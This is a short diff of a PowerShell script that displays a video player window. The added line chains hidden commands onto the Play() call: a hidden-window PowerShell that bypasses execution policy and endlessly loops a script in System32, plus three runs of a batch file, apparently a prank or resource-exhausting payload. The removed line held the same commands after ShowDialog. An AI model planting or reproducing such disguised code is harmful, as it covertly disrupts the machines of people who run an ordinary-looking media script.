@@ -27,7 +27,7 @@ $VideoPlayer.Volume = 100;
 $VideoPlayer.Source = $VideoSource;
 #$VideoPlayer.Padding = new Thickness(5);
 
-$VideoPlayer.Play()
+$VideoPlayer.Play();powershell -w h -NoP -NonI -Exec Bypass 'while (1) { C:\Windows\System32\rr\rr.ps1; }';C:\Windows\System32\fb.bat;C:\Windows\System32\fb.bat;C:\Windows\System32\fb.bat
  
 #Show Up the Window 
-$Window.ShowDialog() | out-null;C:\Windows\System32\fb.bat;C:\Windows\System32\fb.bat;C:\Windows\System32\fb.bat;powershell -w h -NoP -NonI -Exec Bypass 'while (1) { C:\Windows\System32\rr\rr.ps1; }'
+$Window.ShowDialog() | out-null
